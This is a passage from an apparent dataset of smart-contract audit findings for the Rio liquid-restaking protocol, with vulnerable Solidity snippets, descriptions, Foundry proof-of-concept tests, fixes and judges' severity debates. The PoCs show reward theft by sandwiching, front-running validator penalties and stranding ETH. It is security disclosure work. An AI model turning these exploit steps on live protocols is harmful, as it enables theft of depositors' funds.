* 1e18;\n        uint SHARE_AND_BALANCE_OFFSET = 1e3;\n\n        uint virtualTotalShares =  totalSharesInEigenLayer + SHARE_AND_BALANCE_OFFSET;\n        uint virtualTokenBalance = totalUnderlyingTokensInEigenLayer + SHARE_AND_BALANCE_OFFSET;\n\n        uint underlyingTokensToEigenLayerShares = (underlyingTokens * virtualTotalShares) / virtualTokenBalance;\n        uint eigenSharesToUnderlying = (virtualTokenBalance * underlyingTokensToEigenLayerShares) / virtualTotalShares;\n\n        // we expect eigenSharesToUnderlying == underlyingTokens, which is not\n        require(eigenSharesToUnderlying != underlyingTokens);\n\n        return (underlyingTokensToEigenLayerShares, eigenSharesToUnderlying);\n    }\n```\nчDiscussion\nsherlock-admin4\nThe protocol team fixed this issue in PR/commit https://github.com/rio-org/rio-sherlock-audit/pull/11.чThe issue described above can happen frequently as long as the perfect division is not happening when converting shares/assets. In order to solve the issue the amounts and shares has to be perfectly divisible such that the rounding down is not an issue. This can be fixed by owner to airdrop some assets such that this is possible. However, considering how frequent and easy the above scenario can happen and owner needs to do some math to fix the issue, I'll label this as high.\nCode Snippet\nTool used\nManual Review
Ether can stuck when an operators validators are removed due to an user front-runningчmediumч```\nif (validatorDetails.cap > 0 && newValidatorCap == 0) {\n            // If there are active deposits, queue the operator for strategy exit.\n            if (activeDeposits > 0) {\n                -> operatorDetails.queueOperatorStrategyExit(operatorId, BEACON_CHAIN_STRATEGY);\n                .\n            }\n           .\n        } else if (validatorDetails.cap == 0 && newValidatorCap > 0) {\n           .\n        } else {\n           .\n        }\n```\nч"When a full withdrawal occurs in the EigenPod, the excess amount can remain idle within the EigenPod and can only be swept by calling a function in the delegator contract of a specific operator. However, in cases where the owner removes all validators for emergencies or any other reason, a user can frontrun the transaction, willingly or not, causing the excess ETH to become stuck in the EigenPod. The only way to recover the ether would be for the owner to reactivate the validators, which may not be intended since the owner initially wanted to remove all the validators and now needs to add them again.\nLet's assume a Layered Relay Token (LRT) with a beacon chain strategy and only two operators for simplicity. Each operator is assigned two validators, allowing each operator to stake 64 ETH in the PoS staking via the EigenPod.\nThis function triggers a full withdrawal from the operator's delegator EigenPod. The `queueOperatorStrategyExit` function will withdraw the entire validator balance as follows:\n```\nif (validatorDetails.cap > 0 && newValidatorCap == 0) {\n            // If there are active deposits, queue the operator for strategy exit.\n            if (activeDeposits > 0) {\n                -> operatorDetails.queueOperatorStrategyExit(operatorId, BEACON_CHAIN_STRATEGY);\n                .\n            }\n           .\n        } else if (validatorDetails.cap == 0 && newValidatorCap > 0) {\n           .\n        } else {\n           .\n        }\n```\n\n`operatorDetails.queueOperatorStrategyExit` function will full withdraw the entire validator balance as follows:\n```\nfunction queueOperatorStrategyExit(IRioLRTOperatorRegistry.OperatorDetails storage operator, uint8 operatorId, address strategy) internal {\n        IRioLRTOperatorDelegator delegator = IRioLRTOperatorDelegator(operator.delegator);\n\n        uint256 sharesToExit;\n        if (strategy == BEACON_CHAIN_STRATEGY) {\n            // Queues an exit for verified validators only. Unverified validators must by exited once verified,\n            // and ETH must be scraped into the deposit pool. Exits are rounded to the nearest Gwei. It is not\n            // possible to exit ETH with precision less than 1 Gwei. We do not populate `sharesToExit` if the\n            // Eigen Pod shares are not greater than 0.\n            int256 eigenPodShares = delegator.getEigenPodShares();\n            if (eigenPodShares > 0) {\n                sharesToExit = uint256(eigenPodShares).reducePrecisionToGwei();\n            }\n        } else {\n            .\n        }\n        .\n    }\n```\n\nAs observed, the entire EigenPod shares are requested as a withdrawal, which is 64 Ether. However, a user can request a 63 Ether withdrawal before the owner's transaction from the coordinator, which would also trigger a full withdrawal of 64 Ether. In the end, the user would receive 63 Ether, leaving 1 Ether idle in the EigenPod:\n```\nfunction queueETHWithdrawalFromOperatorsForUserSettlement(IRioLRTOperatorRegistry operatorRegistry, uint256 amount) internal returns (bytes32 aggregateRoot) {\n        .\n        for (uint256 i = 0; i < length; ++i) {\n            address delegator = operatorDepositDeallocations[i].delegator;\n\n            -> // Ensure we do not send more than needed to the withdrawal queue. The remaining will stay in the Eigen Pod.\n            uint256 amountToWithdraw = (i == length - 1) ? remainingAmount : operatorDepositDeallocations[i].deposits * ETH_DEPOSIT_SIZE;\n\n            remainingAmount -= amountToWithdraw;\n            roots[i] = IRioLRTOperatorDelegator(delegator).queueWithdrawalForUserSettlement(BEACON_CHAIN_STRATEGY, amountToWithdraw);\n        }\n        .\n    }\n```\n\nIn such a scenario, the queued amount would be 63 Ether, and 1 Ether would remain idle in the EigenPod. Since the owner's intention was to shut down the validators in the operator for good, that 1 Ether needs to be scraped as well. However, the owner is unable to sweep it due to MIN_EXCESS_FULL_WITHDRAWAL_ETH_FOR_SCRAPE:\n```\nfunction scrapeExcessFullWithdrawalETHFromEigenPod() external {\n        // @review this is 1 ether\n        uint256 ethWithdrawable = eigenPod.withdrawableRestakedExecutionLayerGwei().toWei();\n        // @review this is also 1 ether\n        -> uint256 ethQueuedForWithdrawal = getETHQueuedForWithdrawal();\n        if (ethWithdrawable <= ethQueuedForWithdrawal + MIN_EXCESS_FULL_WITHDRAWAL_ETH_FOR_SCRAPE) {\n            revert INSUFFICIENT_EXCESS_FULL_WITHDRAWAL_ETH();\n        }\n        _queueWithdrawalForOperatorExitOrScrape(BEACON_CHAIN_STRATEGY, ethWithdrawable - ethQueuedForWithdrawal);\n    }\n```\n\nWhich means that owner has to set the validator caps for the operator again to recover that 1 ether which might not be possible since the owner decided to shutdown the entire validators for the specific operator.\nAnother scenario from same root cause: 1- There are 64 ether in an operator 2- Someone requests a withdrawal of 50 ether 3- All 64 ether is withdrawn from beacon chain 4- 50 ether sent to the users withdrawal, 14 ether is idle in the EigenPod waiting for someone to call `scrapeExcessFullWithdrawalETHFromEigenPod` 5- An user quickly withdraws 13 ether 6- `withdrawableRestakedExecutionLayerGwei` is 1 ether and `INSUFFICIENT_EXCESS_FULL_WITHDRAWAL_ETH` also 1 ether. Which means the 1 ether can't be re-added to deposit pool until someone withdraws.\nCoded PoC:\n```\n// forge test --match-contract RioLRTOperatorDelegatorTest --match-test test_StakeETHCalledWith0Ether -vv\n    function test_StuckEther() public {\n        uint8 operatorId = addOperatorDelegator(reETH.operatorRegistry, address(reETH.rewardDistributor));\n        address operatorDelegator = reETH.operatorRegistry.getOperatorDetails(operatorId).delegator;\n\n        uint256 TVL = 64 ether;\n        uint256 WITHDRAWAL_AMOUNT = 63 ether;\n        RioLRTOperatorDelegator delegatorContract = RioLRTOperatorDelegator(payable(operatorDelegator));\n\n        // Allocate ETH.\n        reETH.coordinator.depositETH{value: TVL - address(reETH.depositPool).balance}();\n\n\n        // Push funds into EigenLayer.\n        vm.prank(EOA, EOA);\n        reETH.coordinator.rebalance(ETH_ADDRESS);\n\n\n        // Verify validator withdrawal credentials.\n        uint40[] memory validatorIndices = verifyCredentialsForValidators(reETH.operatorRegistry, operatorId, 2);\n\n\n        // Verify and process two full validator exits.\n        verifyAndProcessWithdrawalsForValidatorIndexes(operatorDelegator, validatorIndices);\n\n        // Withdraw some funds.\n        reETH.coordinator.requestWithdrawal(ETH_ADDRESS, WITHDRAWAL_AMOUNT);\n        uint256 withdrawalEpoch = reETH.withdrawalQueue.getCurrentEpoch(ETH_ADDRESS);\n\n        // Skip ahead and rebalance to queue the withdrawal within EigenLayer.\n        skip(reETH.coordinator.rebalanceDelay());\n\n        vm.prank(EOA, EOA);\n        reETH.coordinator.rebalance(ETH_ADDRESS);\n\n        // Verify and process two full validator exits.\n        verifyAndProcessWithdrawalsForValidatorIndexes(operatorDelegator, validatorIndices);\n\n        // Settle with withdrawal epoch.\n        IDelegationManager.Withdrawal[] memory withdrawals = new IDelegationManager.Withdrawal[](1);\n        withdrawals[0] = IDelegationManager.Withdrawal({\n            staker: operatorDelegator,\n            delegatedTo: address(1),\n            withdrawer: address(reETH.withdrawalQueue),\n            nonce: 0,\n            startBlock: 1,\n            strategies: BEACON_CHAIN_STRATEGY.toArray(),\n            shares: WITHDRAWAL_AMOUNT.toArray()\n        });\n        reETH.withdrawalQueue.settleEpochFromEigenLayer(ETH_ADDRESS, withdrawalEpoch, withdrawals, new uint256[](1));\n\n        vm.expectRevert(bytes4(keccak256(""INSUFFICIENT_EXCESS_FULL_WITHDRAWAL_ETH()"")));\n        delegatorContract.scrapeExcessFullWithdrawalETHFromEigenPod();\n    }\n```\n"чMake an emergency function which owner can scrape the excess eth regardless of `MIN_EXCESS_FULL_WITHDRAWAL_ETH_FOR_SCRAPE`\nDiscussion\nnevillehuang\nBorderline Medium/Low, leaving open for discussion. I think I agree with watsons, unless there is someway to retrieve the potentially locked ETH.\nsolimander\nAccepted risk of design, though considering adding an emergency scrape function to avoid the possible annoyance.\nnevillehuang\nI believe this risk should have been mentioned in contest details, so leaving as medium severity.\nsherlock-admin4\nThe protocol team fixed this issue in PR/commit https://github.com/rio-org/rio-sherlock-audit/pull/9.чOwner needs to set the caps again to recover the 1 ether. However, the validators are removed for a reason and adding operators again would probably be not intended since it was a shutdown. Hence, I'll label this as medium.\nCode Snippet\nTool used\nManual Review
A part of ETH rewards can be stolen by sandwiching `claimDelayedWithdrawals()`чmediumч```\nreceive() external payable {\n    (bool success,) = address(rewardDistributor()).call{value: msg.value}('');\n    require(success);\n}\n```\nч"Rewards can be stolen by sandwiching the call to EigenLayer::DelayedWithdrawalRouter::claimDelayedWithdrawals().\nThe protocol handles ETH rewards by sending them to the rewards distributor. There are at least 3 flows that end-up sending funds there:\nWhen the function RioLRTOperatorDelegator::scrapeNonBeaconChainETHFromEigenPod() is called to scrape non beacon chain ETH from an Eigenpod.\nWhen a validator receives rewards via partial withdrawals after the function EigenPod::verifyAndProcessWithdrawals() is called.\nWhen a validator exists and has more than 32ETH the excess will be sent as rewards after the function EigenPod::verifyAndProcessWithdrawals() is called.\nAll of these 3 flows end up queuing a withdrawal to the rewards distributor. After a delay the rewards can claimed by calling the permissionless function EigenLayer::DelayedWithdrawalRouter::claimDelayedWithdrawals(), this call will instantly increase the TVL of the protocol.\nAn attacker can take advantage of this to steal a part of the rewards:\nMint a sensible amount of `LRTTokens` by depositing an accepted asset\nCall EigenLayer::DelayedWithdrawalRouter::claimDelayedWithdrawals(), after which the value of the `LRTTokens` just minted will immediately increase.\nRequest a withdrawal for all the `LRTTokens` via RioLRTCoordinator::requestWithdrawal().\nPOC\nChange RioLRTRewardsDistributor::receive() (to side-step a gas limit bug:\n```\nreceive() external payable {\n    (bool success,) = address(rewardDistributor()).call{value: msg.value}('');\n    require(success);\n}\n```\n\nAdd the following imports to RioLRTOperatorDelegator:\n```\nfunction test_stealRewards() public {\n    address alice = makeAddr(""alice"");\n    address bob = makeAddr(""bob"");\n    uint256 aliceInitialBalance = 40e18;\n    uint256 bobInitialBalance = 40e18;\n    deal(alice, aliceInitialBalance);\n    deal(bob, bobInitialBalance);\n    vm.prank(alice);\n    reETH.token.approve(address(reETH.coordinator), type(uint256).max);\n    vm.prank(bob);\n    reETH.token.approve(address(reETH.coordinator), type(uint256).max);\n\n    //->Operator delegator and validators are added to the protocol\n    uint8 operatorId = addOperatorDelegator(reETH.operatorRegistry, address(reETH.rewardDistributor));\n    RioLRTOperatorDelegator operatorDelegator =\n        RioLRTOperatorDelegator(payable(reETH.operatorRegistry.getOperatorDetails(operatorId).delegator));\n\n    //-> Alice deposits ETH in the protocol\n    vm.prank(alice);\n    reETH.coordinator.depositETH{value: aliceInitialBalance}();\n    \n    //-> Rebalance is called and the ETH deposited in a validator\n    vm.prank(EOA, EOA);\n    reETH.coordinator.rebalance(ETH_ADDRESS);\n\n    //-> Create a new validator with a 40ETH balance and verify his credentials.\n    //-> This is to ""simulate"" rewards accumulation\n    uint40[] memory validatorIndices = new uint40[](1);\n    IRioLRTOperatorRegistry.OperatorPublicDetails memory details = reETH.operatorRegistry.getOperatorDetails(operatorId);\n    bytes32 withdrawalCredentials = operatorDelegator.withdrawalCredentials();\n    beaconChain.setNextTimestamp(block.timestamp);\n    CredentialsProofs memory proofs;\n    (validatorIndices[0], proofs) = beaconChain.newValidator({\n        balanceWei: 40 ether,\n        withdrawalCreds: abi.encodePacked(withdrawalCredentials)\n    });\n    \n    //-> Verify withdrawal crendetials\n    vm.prank(details.manager);\n    reETH.operatorRegistry.verifyWithdrawalCredentials(\n        operatorId,\n        proofs.oracleTimestamp,\n        proofs.stateRootProof,\n        proofs.validatorIndices,\n        proofs.validatorFieldsProofs,\n        proofs.validatorFields\n    );\n\n    //-> A full withdrawal for the validator is processed, 8ETH (40ETH - 32ETH) will be queued as rewards\n    verifyAndProcessWithdrawalsForValidatorIndexes(address(operatorDelegator), validatorIndices);\n\n    //-> Bob, an attacker, does the following:\n    //      1. Deposits 40ETH and receives ~40e18 LRTTokens\n    //      2. Cliam the withdrawal for the validator, which will instantly increase the TVL by ~7.2ETH\n    //      3. Requests a withdrawal with all of the LRTTokens \n    {\n        //1. Deposits 40ETH and receives ~40e18 LRTTokens\n        vm.startPrank(bob);\n        reETH.coordinator.depositETH{value: bobInitialBalance}();\n\n        //2. Cliam the withdrawal for the validator, which will instantly increase the TVL by ~7.2ETH\n        uint256 TVLBefore = reETH.assetRegistry.getTVL();\n        delayedWithdrawalRouter.claimDelayedWithdrawals(address(operatorDelegator), 1); \n        uint256 TVLAfter = reETH.assetRegistry.getTVL();\n\n        //->TVL increased by 7.2ETH\n        assertEq(TVLAfter - TVLBefore, 7.2e18);\n\n        //3. Requests a withdrawal with all of the LRTTokens \n        reETH.coordinator.requestWithdrawal(ETH_ADDRESS, reETH.token.balanceOf(bob));\n        vm.stopPrank();\n    }\n    \n    //-> Wait and rebalance\n    skip(reETH.coordinator.rebalanceDelay());\n    vm.prank(EOA, EOA);\n    reETH.coordinator.rebalance(ETH_ADDRESS);\n\n    //-> Bob withdraws the funds he requested\n    vm.prank(bob);\n    reETH.withdrawalQueue.claimWithdrawalsForEpoch(IRioLRTWithdrawalQueue.ClaimRequest({asset: ETH_ADDRESS, epoch: 0}));\n\n    //-> Bob has stole ~50% of the rewards and has 3.59ETH more than he initially started with\n    assertGt(bob.balance, bobInitialBalance);\n    assertEq(bob.balance - bobInitialBalance, 3599550056000000000);\n}\n```\n"чWhen requesting withdrawals via RioLRTCoordinator::requestWithdrawal() don't distribute the rewards received in the current epoch.\nDiscussion\nKupiaSecAdmin\nEscalate\nThis should be considered as Invalid. The logic is pretty natural and this sandwiching can not be considered as attack. `claimDelayedWithdrawals` should be called at some point by anyone, and minting transactions come before the claim transaction and requestWithdrawal transactions come after claim transaction is natural logic.\nsherlock-admin2\nEscalate\nThis should be considered as Invalid. The logic is pretty natural and this sandwiching can not be considered as attack. `claimDelayedWithdrawals` should be called at some point by anyone, and minting transactions come before the claim transaction and requestWithdrawal transactions come after claim transaction is natural logic.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n0xcats\nEscalate\nThis should be considered as Invalid. The logic is pretty natural and this sandwiching can not be considered as attack. `claimDelayedWithdrawals` should be called at some point by anyone, and minting transactions come before the claim transaction and requestWithdrawal transactions come after claim transaction is natural logic.\nYou can take a look at my issue of #22.\nI don't really understand how you can say this is natural and that sandwiching is not considered an attack? Honest users have absolutely no incentive to stake their funds for continuous periods of time if anyone can just come and front-run reward distribution and steal rewards.\nnevillehuang\nI'm also unsure how this is considered normal logic unless otherwise stated as an known risk, which is not. Any user diluting rewards/stealing rewards seems fair to be valid to me.\nCzar102\nI agree with @0xcats and @nevillehuang. Planning to reject the escalation and leave the issue as is.\nCzar102\nResult: Medium Has duplicates\nsherlock-admin3\nEscalations have been resolved successfully!\nEscalation status:\nKupiaSecAdmin: rejectedчRewards can be stolen by sandwiching the call to EigenLayer::DelayedWithdrawalRouter::claimDelayedWithdrawals(), however this requires a bigger investment in funds the higher the protocol TVL.\nCode Snippet\nTool used\nManual Review
The protocol can't receive rewards because of low gas limits on ETH transfersчmediumч```\n(bool success,) = recipient.call{value: amount, gas: 10_000}('');\nif (!success) {revert ETH_TRANSFER_FAILED();}\n```\nч"The hardcoded gas limit of the Asset::transferETH() function, used to transfer ETH in the protocol, is too low and will result unwanted reverts.\nETH transfers in the protocol are always done via Asset::transferETH(), which performs a low-level call with an hardcoded gas limit of 10_000:\n```\n(bool success,) = recipient.call{value: amount, gas: 10_000}('');\nif (!success) {revert ETH_TRANSFER_FAILED();}\n```\n\nThe hardcoded `10_000` gas limit is not high enough for the protocol to be able receive and distribute rewards. Rewards are currently only available for native ETH, an are received by Rio via:\nPartial withdrawals\nETH in excess of `32ETH` on full withdrawals\nThe flow to receive rewards requires two steps:\nAn initial call to EigenPod::verifyAndProcessWithdrawals(), which queues a withdrawal to the Eigenpod owner: an `RioLRTOperatorDelegator` instance\nA call to DelayedWithdrawalRouter::claimDelayedWithdrawals().\nThe call to DelayedWithdrawalRouter::claimDelayedWithdrawals() triggers the following flow:\nETH are transferred to the RioLRTOperatorDelegator instance, where the `receive()` function is triggered.\nThe `receive()` function of RioLRTOperatorDelegator transfers ETH via Asset::transferETH() to the RioLRTRewardDistributor, where another `receive()` function is triggered.\nThe `receive()` function of RioLRTRewardDistributor transfers ETH via Asset::transferETH() to the `treasury`, the `operatorRewardPool` and the `RioLRTDepositPool`.\nThe gas is limited at `10_000` in step `2` and is not enough to perform step `3`, making it impossible for the protocol to receive rewards and leaving funds stuck.\nPOC\nthen copy-paste:\n```\nfunction test_outOfGasOnRewards() public {\n    address alice = makeAddr(""alice"");\n    uint256 initialBalance = 40e18;\n    deal(alice, initialBalance);\n    vm.prank(alice);\n    reETH.token.approve(address(reETH.coordinator), type(uint256).max);\n\n    //->Operator delegator and validators are added to the protocol\n    uint8 operatorId = addOperatorDelegator(reETH.operatorRegistry, address(reETH.rewardDistributor));\n    RioLRTOperatorDelegator operatorDelegator =\n        RioLRTOperatorDelegator(payable(reETH.operatorRegistry.getOperatorDetails(operatorId).delegator));\n\n    //-> Alice deposits ETH in the protocol\n    vm.prank(alice);\n    reETH.coordinator.depositETH{value: initialBalance}();\n    \n    //-> Rebalance is called and the ETH deposited in a validator\n    vm.prank(EOA, EOA);\n    reETH.coordinator.rebalance(ETH_ADDRESS);\n\n    //-> Create a new validator with a 40ETH balance and verify his credentials.\n    //-> This is to ""simulate"" rewards accumulation\n    uint40[] memory validatorIndices = new uint40[](1);\n    IRioLRTOperatorRegistry.OperatorPublicDetails memory details = reETH.operatorRegistry.getOperatorDetails(operatorId);\n    bytes32 withdrawalCredentials = operatorDelegator.withdrawalCredentials();\n    beaconChain.setNextTimestamp(block.timestamp);\n    CredentialsProofs memory proofs;\n    (validatorIndices[0], proofs) = beaconChain.newValidator({\n        balanceWei: 40 ether,\n        withdrawalCreds: abi.encodePacked(withdrawalCredentials)\n    });\n    \n    //-> Verify withdrawal crendetials\n    vm.prank(details.manager);\n    reETH.operatorRegistry.verifyWithdrawalCredentials(\n        operatorId,\n        proofs.oracleTimestamp,\n        proofs.stateRootProof,\n        proofs.validatorIndices,\n        proofs.validatorFieldsProofs,\n        proofs.validatorFields\n    );\n\n    //-> Process a full withdrawal, 8ETH (40ETH - 32ETH) will be queued withdrawal as ""rewards""\n    verifyAndProcessWithdrawalsForValidatorIndexes(address(operatorDelegator), validatorIndices);\n\n    //-> Call `claimDelayedWithdrawals` to claim the withdrawal\n    delayedWithdrawalRouter.claimDelayedWithdrawals(address(operatorDelegator), 1); //❌ Reverts for out-of-gas\n}\n```\n"ч
Stakers can avoid validator penaltiesчmediumч```\nIRioLRTOperatorRegistry.StrategyShareCap[] public emptyStrategyShareCaps;\nfunction test_avoidInstantPriceDrop() public {\n    //-> Add two operators with 1 validator each\n    uint8[] memory operatorIds = addOperatorDelegators(\n        reETH.operatorRegistry,\n        address(reETH.rewardDistributor),\n        2,\n        emptyStrategyShareCaps,\n        1\n    );\n    address operatorAddress0 = address(uint160(1));\n\n    //-> Deposit ETH so there's 74ETH in the deposit pool\n    uint256 depositAmount = 2*ETH_DEPOSIT_SIZE - address(reETH.depositPool).balance;\n    uint256 amountToWithdraw = 10 ether;\n    reETH.coordinator.depositETH{value: amountToWithdraw + depositAmount}();\n\n    //-> Stake the 64ETH on the validators, 32ETH each and 10 ETH stay in the deposit pool\n    vm.prank(EOA, EOA);\n    reETH.coordinator.rebalance(ETH_ADDRESS);\n\n    //-> Attacker notices a validator is going receive penalties and immediately requests a withdrawal of 10ETH\n    reETH.coordinator.requestWithdrawal(ETH_ADDRESS, amountToWithdraw);\n\n    //-> Validator get some penalties and Eigenlayer notified \n    //IMPORTANT: The following block of code it's a simulation of what would happen if a validator balances gets lowered because of penalties\n    //and `verifyBalanceUpdates()` gets called on Eigenlayer. It uses another bug to achieve an instant loss of TVL.\n\n    //      ~~~Start penalties simulation~~~\n    {\n        //-> Verify validators credentials of the two validators\n        verifyCredentialsForValidators(reETH.operatorRegistry, 1, 1);\n        verifyCredentialsForValidators(reETH.operatorRegistry, 2, 1);\n\n        //-> Cache current TVL and ETH Balance\n        uint256 TVLBefore = reETH.coordinator.getTVL();\n\n        //->Operator calls `undelegate()` on Eigenlayer\n        //IMPORTANT: This achieves the same a calling `verifyBalanceUpdates()` on Eigenlayer after a validator suffered penalties,\n        //an instant drop in TVL.\n        IRioLRTOperatorRegistry.OperatorPublicDetails memory details = reETH.operatorRegistry.getOperatorDetails(operatorIds[0]);\n        vm.prank(operatorAddress0);\n        delegationManager.undelegate(details.delegator);\n\n        //-> TVL dropped\n        uint256 TVLAfter = reETH.coordinator.getTVL();\n\n        assertLt(TVLAfter, TVLBefore);\n    }\n    //      ~~~End penalties simulation~~~\n\n    //-> Rebalance gets called\n    skip(reETH.coordinator.rebalanceDelay());\n    vm.prank(EOA, EOA);\n    reETH.coordinator.rebalance(ETH_ADDRESS);\n\n    //-> Attacker receives all of the ETH he withdrew, avoiding the effect of penalties\n    uint256 balanceBefore = address(this).balance;\n    reETH.withdrawalQueue.claimWithdrawalsForEpoch(IRioLRTWithdrawalQueue.ClaimRequest({asset: ETH_ADDRESS, epoch: 0}));\n    uint256 balanceAfter = address(this).balance;\n    assertEq(balanceAfter - balanceBefore, amountToWithdraw);\n}\n```\nчStakers can frontrun validators penalties and slashing events with a withdrawal request in order to avoid the loss, this is possible if the deposit pool has enough liquidity available.\nValidators can lose part of their deposit via penalties or slashing events:\nIn case of penalties Eigenlayer can be notified of the balance drop via the permissionless function EigenPod::verifyBalanceUpdates().\nIn case of slashing the validator is forced to exit and Eigenlayer can be notified via the permissionless function EigenPod::verifyAndProcessWithdrawals() because the slashing event is effectively a full withdrawal.\nAs soon as either EigenPod::verifyBalanceUpdates() or EigenPod::verifyAndProcessWithdrawals() is called the TVL of the Rio protocol drops instantly. This is because both of the functions update the variable podOwnerShares[podOwner]:\nEigenPod::verifyBalanceUpdates() will update the variable here\nEigenPod::verifyAndProcessWithdrawals() will update the variable here\nThis makes it possible for stakers to:\nRequest a withdrawal via RioLRTCoordinator::rebalance() for all the `LRTTokens` held.\nCall either EigenPod::verifyBalanceUpdates() or EigenPod::verifyAndProcessWithdrawals().\nAt this point when RioLRTCoordinator::rebalance() will be called and a withdrawal will be queued that does not include penalties or slashing.\nIt's possible to withdraw `LRTTokens` while avoiding penalties or slashing up to the amount of liquidity available in the deposit pool.\nPOC\nI wrote a POC whose main point is to show that requesting a withdrawal before an instant TVL drop will withdraw the full amount requested without taking the drop into account. The POC doesn't show that EigenPod::verifyBalanceUpdates() or EigenPod::verifyAndProcessWithdrawals() actually lowers the TVL because I wasn't able to implement it in the tests.\nthen copy-paste:\n```\nIRioLRTOperatorRegistry.StrategyShareCap[] public emptyStrategyShareCaps;\nfunction test_avoidInstantPriceDrop() public {\n    //-> Add two operators with 1 validator each\n    uint8[] memory operatorIds = addOperatorDelegators(\n        reETH.operatorRegistry,\n        address(reETH.rewardDistributor),\n        2,\n        emptyStrategyShareCaps,\n        1\n    );\n    address operatorAddress0 = address(uint160(1));\n\n    //-> Deposit ETH so there's 74ETH in the deposit pool\n    uint256 depositAmount = 2*ETH_DEPOSIT_SIZE - address(reETH.depositPool).balance;\n    uint256 amountToWithdraw = 10 ether;\n    reETH.coordinator.depositETH{value: amountToWithdraw + depositAmount}();\n\n    //-> Stake the 64ETH on the validators, 32ETH each and 10 ETH stay in the deposit pool\n    vm.prank(EOA, EOA);\n    reETH.coordinator.rebalance(ETH_ADDRESS);\n\n    //-> Attacker notices a validator is going receive penalties and immediately requests a withdrawal of 10ETH\n    reETH.coordinator.requestWithdrawal(ETH_ADDRESS, amountToWithdraw);\n\n    //-> Validator get some penalties and Eigenlayer notified \n    //IMPORTANT: The following block of code it's a simulation of what would happen if a validator balances gets lowered because of penalties\n    //and `verifyBalanceUpdates()` gets called on Eigenlayer. It uses another bug to achieve an instant loss of TVL.\n\n    //      ~~~Start penalties simulation~~~\n    {\n        //-> Verify validators credentials of the two validators\n        verifyCredentialsForValidators(reETH.operatorRegistry, 1, 1);\n        verifyCredentialsForValidators(reETH.operatorRegistry, 2, 1);\n\n        //-> Cache current TVL and ETH Balance\n        uint256 TVLBefore = reETH.coordinator.getTVL();\n\n        //->Operator calls `undelegate()` on Eigenlayer\n        //IMPORTANT: This achieves the same a calling `verifyBalanceUpdates()` on Eigenlayer after a validator suffered penalties,\n        //an instant drop in TVL.\n        IRioLRTOperatorRegistry.OperatorPublicDetails memory details = reETH.operatorRegistry.getOperatorDetails(operatorIds[0]);\n        vm.prank(operatorAddress0);\n        delegationManager.undelegate(details.delegator);\n\n        //-> TVL dropped\n        uint256 TVLAfter = reETH.coordinator.getTVL();\n\n        assertLt(TVLAfter, TVLBefore);\n    }\n    //      ~~~End penalties simulation~~~\n\n    //-> Rebalance gets called\n    skip(reETH.coordinator.rebalanceDelay());\n    vm.prank(EOA, EOA);\n    reETH.coordinator.rebalance(ETH_ADDRESS);\n\n    //-> Attacker receives all of the ETH he withdrew, avoiding the effect of penalties\n    uint256 balanceBefore = address(this).balance;\n    reETH.withdrawalQueue.claimWithdrawalsForEpoch(IRioLRTWithdrawalQueue.ClaimRequest({asset: ETH_ADDRESS, epoch: 0}));\n    uint256 balanceAfter = address(this).balance;\n    assertEq(balanceAfter - balanceBefore, amountToWithdraw);\n}\n```\nч"
All operators can have ETH deposits regardless of the cap setted for them leading to miscalculated TVLчmediumч```\nfunction getTVLForAsset(address asset) public view returns (uint256) {\n        uint256 balance = getTotalBalanceForAsset(asset);\n        if (asset == ETH_ADDRESS) {\n            return balance;\n        }\n        return convertToUnitOfAccountFromAsset(asset, balance);\n    }\n\n    function getTotalBalanceForAsset(address asset) public view returns (uint256) {\n        if (!isSupportedAsset(asset)) revert ASSET_NOT_SUPPORTED(asset);\n\n        address depositPool_ = address(depositPool());\n        if (asset == ETH_ADDRESS) {\n            return depositPool_.balance + getETHBalanceInEigenLayer();\n        }\n\n        uint256 sharesHeld = getAssetSharesHeld(asset);\n        uint256 tokensInRio = IERC20(asset).balanceOf(depositPool_);\n        uint256 tokensInEigenLayer = convertFromSharesToAsset(getAssetStrategy(asset), sharesHeld);\n\n        return tokensInRio + tokensInEigenLayer;\n    }\n\n    function getETHBalanceInEigenLayer() public view returns (uint256 balance) {\n        balance = ethBalanceInUnverifiedValidators;\n\n        IRioLRTOperatorRegistry operatorRegistry_ = operatorRegistry();\n        -> uint8 endAtID = operatorRegistry_.operatorCount() + 1; // Operator IDs start at 1.\n        -> for (uint8 id = 1; id < endAtID; ++id) {\n            -> balance += operatorDelegator(operatorRegistry_, id).getETHUnderManagement();\n        }\n    }\n```\nч"Some operators might not be eligible for using some strategies in the LRT's underlying tokens. However, in default every operator can have ETH deposits which would impact the TVL/Exchange rate of the LRT regardless of they have a cap or not.\nFirst, let's examine how an operator can have ETH deposit\nAn operator can have ETH deposits by simply staking in beacon chain, to do so they are not mandatory to call EigenPods ""stake"" function. They can do it separately without calling the EigenPods stake function.\nAlso, every operator delegator contract can call `verifyWithdrawalCredentials` to increase EigenPod shares and decrease the queued ETH regardless of they are active operator or they have a cap determined for BEACON_CHAIN_STRATEGY.\nNow, let's look at how the TVL of ETH (BEACON_CHAIN_STRATEGY) is calculated in the AssetRegistry:\n```\nfunction getTVLForAsset(address asset) public view returns (uint256) {\n        uint256 balance = getTotalBalanceForAsset(asset);\n        if (asset == ETH_ADDRESS) {\n            return balance;\n        }\n        return convertToUnitOfAccountFromAsset(asset, balance);\n    }\n\n    function getTotalBalanceForAsset(address asset) public view returns (uint256) {\n        if (!isSupportedAsset(asset)) revert ASSET_NOT_SUPPORTED(asset);\n\n        address depositPool_ = address(depositPool());\n        if (asset == ETH_ADDRESS) {\n            return depositPool_.balance + getETHBalanceInEigenLayer();\n        }\n\n        uint256 sharesHeld = getAssetSharesHeld(asset);\n        uint256 tokensInRio = IERC20(asset).balanceOf(depositPool_);\n        uint256 tokensInEigenLayer = convertFromSharesToAsset(getAssetStrategy(asset), sharesHeld);\n\n        return tokensInRio + tokensInEigenLayer;\n    }\n\n    function getETHBalanceInEigenLayer() public view returns (uint256 balance) {\n        balance = ethBalanceInUnverifiedValidators;\n\n        IRioLRTOperatorRegistry operatorRegistry_ = operatorRegistry();\n        -> uint8 endAtID = operatorRegistry_.operatorCount() + 1; // Operator IDs start at 1.\n        -> for (uint8 id = 1; id < endAtID; ++id) {\n            -> balance += operatorDelegator(operatorRegistry_, id).getETHUnderManagement();\n        }\n    }\n```\n\nAs we can see above, regardless of the operators cap the entire active validator counts are looped.\n```\nfunction getEigenPodShares() public view returns (int256) {\n        return eigenPodManager.podOwnerShares(address(this));\n    }\n\n    function getETHQueuedForWithdrawal() public view returns (uint256) {\n        uint256 ethQueuedSlotData;\n        assembly {\n            ethQueuedSlotData := 